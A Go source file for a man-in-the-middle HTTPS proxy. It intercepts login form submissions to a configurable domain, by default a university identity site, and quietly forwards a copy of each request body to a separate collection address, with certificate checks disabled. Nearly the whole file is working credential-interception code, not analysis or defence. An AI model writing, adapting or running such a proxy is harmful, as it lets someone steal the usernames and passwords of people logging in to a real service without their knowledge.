package main

import (
    "bytes"
    "flag"
    "io/ioutil"
    "log"
    "net/http"
    "time"
    "crypto/tls"
    "crypto/x509"
    "path/filepath"

    "github.com/elazarl/goproxy"
)

func orPanic(err error) {
    if err != nil {
        panic(err)
    }
}

func main() {
    certFile, _ := filepath.Abs("cert.pem")
    keyFile, _ := filepath.Abs("key.pem")
    caFile, _ := filepath.Abs("rootCA.pem")

    verbose := flag.Bool("v", false, "should every proxy request be logged to stdout")
    addr := flag.String("addr", ":8080", "proxy listen address")
    out := flag.String("out", "", "address to forward request copies")
    domain := flag.String("domain", "identity.fu-berlin.de:443", "site domain of which login packets are forwarded")
    flag.Parse()

    log.Println("Starting proxy...")

    // Use custom CA
    setCA(caCert, caKey)

    // Load goproxy cert
    cert, err := tls.LoadX509KeyPair(certFile, keyFile)
    if err != nil {
        log.Fatal(err)
    }

    // Load root CA cert
    rootCA, err := ioutil.ReadFile(caFile)
    if err != nil {
        log.Fatal(err)
    }
    caCertPool := x509.NewCertPool()
    caCertPool.AppendCertsFromPEM(rootCA)

    // Create a new HTTP proxy server
    proxy := goproxy.NewProxyHttpServer()

    // Do man-in-the-middle proxy
    proxy.OnRequest(goproxy.ReqHostIs(*domain)).HandleConnect(goproxy.AlwaysMitm)

    // Forward a copy of login request
    proxy.OnRequest(goproxy.ReqHostIs(*domain)).DoFunc(
        func(r *http.Request,ctx *goproxy.ProxyCtx)(*http.Request,*http.Response) {
        // Filter out requests other than login forms
        if r.Header.Get("Content-Type") != "application/x-www-form-urlencoded" {
            return r, nil
        }
        log.Println("Login request")
        // Read into a buffer and split to two new readers 
        // since getting the form value requires reading the body
        buf, _ := ioutil.ReadAll(r.Body)
        rdr1 := ioutil.NopCloser(bytes.NewBuffer(buf))
        rdr2 := ioutil.NopCloser(bytes.NewBuffer(buf))
        r.Body = rdr1

        // Setup HTTPS client
        tlsConfig := &tls.Config{
            Certificates: []tls.Certificate{cert},
            RootCAs:      caCertPool,
            InsecureSkipVerify: true,  // when pwstat uses self-signed certificate 
        }
        // tlsConfig.BuildNameToCertificate()
        transport := &http.Transport{TLSClientConfig: tlsConfig}
        
        // HTTP client to send the request copy
        hc := &http.Client{Transport: transport, Timeout: time.Second * 10}
        // hc := &http.Client{Timeout: time.Second * 10}
        new_req, err := http.NewRequest("POST", "https://"+ *out, r.Body ) 

        if err != nil {
            log.Println(err)
        } else {
            new_req.Header = r.Header
            new_req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
            // New go routine to make the request
            go func(client *http.Client, req *http.Request) {
                resp, err := client.Do(new_req)
                if err != nil {
                    log.Println(err)
                } else {
                    defer resp.Body.Close()
                }
            } (hc, new_req)
        }

        // Set the body back to the buffer with unread body
        r.Body = rdr2
        return r,nil
    })

    proxy.Verbose = *verbose
 
    // Bind proxy to a given port
    log.Fatal(http.ListenAndServe(*addr, proxy))

}

